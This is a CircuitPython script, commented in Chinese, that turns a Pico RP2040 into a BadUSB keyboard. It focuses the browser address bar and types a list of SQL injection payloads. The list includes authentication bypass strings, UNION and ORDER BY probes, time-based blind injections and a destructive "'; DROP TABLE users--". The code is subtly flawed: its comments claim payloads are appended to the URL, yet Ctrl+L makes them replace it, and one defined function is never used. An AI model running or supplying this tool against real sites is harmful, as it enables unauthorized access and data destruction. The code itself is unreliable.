# Pico RP2040 BadUSB - SQL注入半自动化测试工具
# 功能：自动定位到浏览器地址栏，依次输入数字型SQL注入测试payload
# 使用方法：插入Pico后，手动打开目标网页，脚本会自动在地址栏输入测试payload

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.consumer_control_code import ConsumerControlCode

# 初始化HID设备
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)
consumer_control = ConsumerControl(usb_hid.devices)

# 测试延迟设置
STARTUP_DELAY = 2.0      # 启动延迟（秒）
BETWEEN_TESTS_DELAY = 2.0  # 每个测试之间的延迟（秒）

# 数字型SQL注入测试payload列表
# 可以根据需要添加或删除
PAYLOADS = [
    "1' OR '1'='1--",          # 经典注入
    "1' AND '1'='1--",         # 永真条件
    "1' AND '1'='2--",         # 永假条件
    "1' ORDER BY 1--",          # 测试列数
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' ORDER BY 10--",
    "1' UNION SELECT NULL--",  # 联合查询
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(5)--",        # 时间盲注（注意：这会延迟5秒）
    "1' AND 1=1",
    "1' OR 1=1",
    "' OR '1'='1",
    "admin'--",                 # 绕过认证
    "1' AND BENCHMARK(1000000,MD5(1))--",  # 盲注
    "1' AND 1=2 UNION SELECT 1,2,3--",    # 联合注入测试
    "1'; DROP TABLE users--",   # 危险操作（谨慎使用）
]

def press_key(key_code):
    """按下并释放单个按键"""
    keyboard.press(key_code)
    time.sleep(0.02)
    keyboard.release(key_code)

def press_mod_key(modifiers, key_code):
    """按下组合键（如Ctrl+L）"""
    keyboard.press(*modifiers)
    time.sleep(0.02)
    keyboard.press(key_code)
    time.sleep(0.02)
    keyboard.release_all()
    time.sleep(0.05)

def type_text(text):
    """输入文本"""
    keyboard_layout.write(text)
    time.sleep(0.05)

def focus_address_bar():
    """定位到浏览器地址栏（Ctrl+L 或 Cmd+L）"""
    press_mod_key((Keyboard.MODIFIER_LEFT_CONTROL,), Keyboard.KEY_L)

def run_test(payload):
    """执行单个测试"""
    # 清空地址栏并输入当前URL（这里简化处理，直接在新URL后追加参数）
    # 实际使用时，你需要根据页面具体情况调整
    type_text(payload)
    press_key(Keyboard.KEY_ENTER)
    time.sleep(BETWEEN_TESTS_DELAY)

def main():
    """主程序"""
    # 启动延迟，等待设备识别
    time.sleep(STARTUP_DELAY)

    # 定位到浏览器地址栏
    focus_address_bar()
    time.sleep(0.5)

    # 循环测试所有payload
    for i, payload in enumerate(PAYLOADS, 1):
        print(f"Testing payload {i}/{len(PAYLOADS)}: {payload}")

        # 输入当前payload并提交
        # 注意：这里假设你在目标URL基础上直接追加测试参数
        # 例如：如果URL是 example.com/page?id=，会自动追加到后面
        type_text(payload)

        # 提交（按回车）
        press_key(Keyboard.KEY_ENTER)

        # 等待页面加载，给你观察时间
        time.sleep(BETWEEN_TESTS_DELAY)

        # 定位回地址栏，准备下一个测试
        focus_address_bar()
        time.sleep(0.5)

    print("Testing completed!")

# 运行主程序
main()
